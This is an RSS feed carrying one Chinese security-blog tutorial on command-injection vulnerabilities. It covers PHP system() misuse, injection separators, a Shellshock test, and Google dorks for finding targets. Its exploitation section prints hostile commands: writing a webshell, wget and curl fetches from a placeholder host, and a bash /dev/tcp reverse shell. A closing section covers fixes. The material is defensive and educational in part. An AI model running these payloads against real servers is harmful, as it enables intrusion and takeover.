<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>命令执行 on </title>
    <link>http://wyb0.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</link>
    <description>Recent content in 命令执行 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Sun, 24 Jul 2016 14:32:51 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>命令执行漏洞</title>
      <link>http://wyb0.com/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Sun, 24 Jul 2016 14:32:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
      <description>

&lt;h3 id=&#34;0x00-命令执行:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x00 命令执行&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、
passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令
拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-利用条件:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x01 利用条件&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;应用调用执行系统命令的函数&lt;/li&gt;
&lt;li&gt;将用户输入作为系统命令的参数拼接到了命令行中&lt;/li&gt;
&lt;li&gt;没有对用户输入进行过滤或过滤不严&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;0x02-漏洞分类:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x02 漏洞分类&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;代码层过滤不严&lt;br /&gt;
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：&lt;br /&gt;
system(&amp;ldquo;/bin/program --arg $arg&amp;rdquo;);&lt;/li&gt;
&lt;li&gt;系统的漏洞造成命令执行&lt;br /&gt;
bash破壳漏洞(CVE-2014-6271)&lt;br /&gt;
执行&lt;code&gt;env x=&#39;() { :;}; echo vulnerable&#39; bash -c &amp;quot;echo this is a test&amp;quot;&lt;/code&gt;后&lt;br /&gt;
若输出vulnerable则证明存在漏洞&lt;/li&gt;
&lt;li&gt;调用的第三方组件存在代码执行漏洞&lt;br /&gt;
如WordPress中用来处理图片的ImageMagick组件&lt;br /&gt;
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)&lt;br /&gt;
ThinkPHP命令执行&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;0x03-漏洞危害:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x03 漏洞危害&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;继承Web服务程序的权限去执行系统命令或读写文件&lt;/li&gt;
&lt;li&gt;反弹shell&lt;/li&gt;
&lt;li&gt;控制整个网站甚至控制服务器&lt;/li&gt;
&lt;li&gt;进一步内网渗透&lt;/li&gt;
&lt;li&gt;等等&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;0x04-漏洞挖掘:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x04 漏洞挖掘&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;可以google hacking&lt;br /&gt;
尝试：filetype:action或filetype:do来找struts2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x05-漏洞可能代码-以system为例:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x05 漏洞可能代码(以system为例)&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;1. system(&amp;quot;$arg&amp;quot;);  //直接输入即可
2. system(&amp;quot;/bin/prog $arg&amp;quot;);  //直接输入;ls
3. system(&amp;quot;/bin/prog -p $arg&amp;quot;);  //和2一样
4. system(&amp;quot;/bin/prog --p=\&amp;quot;$arg\&amp;quot;&amp;quot;);  //可以输入&amp;quot;;ls;&amp;quot;
5. system(&amp;quot;/bin/prog --p=&#39;$arg&#39;&amp;quot;);  //可以输入&#39;;ls;&#39;

在Linux上，上面的;也可以用|、||代替
    ;前面的执行完执行后面的
    |是管道符，显示后面的执行结果
    ||当前面的执行出错时执行后面的

在Windows上，不能用;可以用&amp;amp;、&amp;amp;&amp;amp;、|、||代替
    &amp;amp;前面的语句为假则直接执行后面的
    &amp;amp;&amp;amp;前面的语句为假则直接出错，后面的也不执行
    |直接执行后面的语句
    ||前面出错执行后面的
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x06-漏洞利用:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x06 漏洞利用&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;示例一&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $arg = $_GET[&#39;cmd&#39;];
    if ($arg) {
        system(&amp;quot;$arg&amp;quot;);
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution1.png&#34; alt=&#34;命令执行示例1.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;示例二&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $arg = $_GET[&#39;cmd&#39;];
    if ($arg) {
        system(&amp;quot;ping -c 3 $arg&amp;quot;);
    }
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution2.png&#34; alt=&#34;命令执行示例2.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;示例三&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $arg = $_GET[&#39;cmd&#39;];
    if ($arg) {
        system(&amp;quot;ls -al \&amp;quot;$arg\&amp;quot;&amp;quot;);
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution3.png&#34; alt=&#34;命令执行示例3.png&#34;&gt;
&lt;/div&gt;

注：若引号被转义，则可以用&lt;b&gt;`id`&lt;/b&gt;来执行&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;示例四&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $arg = $_GET[&#39;cmd&#39;];
    if ($arg) {
        system(&amp;quot;ls -al &#39;$arg&#39;&amp;quot;);
    }
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/command_execution4.png&#34; alt=&#34;命令执行示例4.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x07-其他:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x07 其他&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;动态函数调用&lt;br /&gt;
在cmd.php中的代码如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $fun = $_GET[&#39;fun&#39;];
    $par = $_GET[&#39;par&#39;];
    $fun($par);
?&amp;gt;

提交http://localhost/cmd.php?fun=system&amp;amp;par=net user，  
最终执行的是system(&amp;quot;net user&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x08-关于获取webshell:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x08 关于获取webshell&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;要有写权限！&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.得到当前或绝对路径(可以用pwd)
2.写文件:
    用?cmd=echo &amp;quot;&amp;lt;?php phpinfo()?&amp;gt;&amp;quot; &amp;gt; /var/www/html/info.php
    或?cmd=wget -O /var/www/html/info.php http://www.xx.com/phpinfo.txt
    或?cmd=curl http://www.xx.com/phpinfo.txt &amp;gt; /var/www/html/info.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x09-反弹shell:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x09 反弹shell&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;远程执行nc -vlp 8888
?cmd=bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8888 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x0a-漏洞修复:6d604aba3a1d4f9f753160fa6d18da80&#34;&gt;0x0A 漏洞修复&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;尽量少用执行命令的函数或者直接禁用&lt;/li&gt;
&lt;li&gt;参数值尽量使用引号包括&lt;/li&gt;
&lt;li&gt;在使用动态函数之前，确保使用的函数是指定的函数之一&lt;/li&gt;
&lt;li&gt;在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    $arg = $_GET[&#39;cmd&#39;];
    // $arg = addslashes($arg);
    $arg = escapeshellcmd($arg);  //拼接前就处理
    if ($arg) {
        system(&amp;quot;ls -al &#39;$arg&#39;&amp;quot;);
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>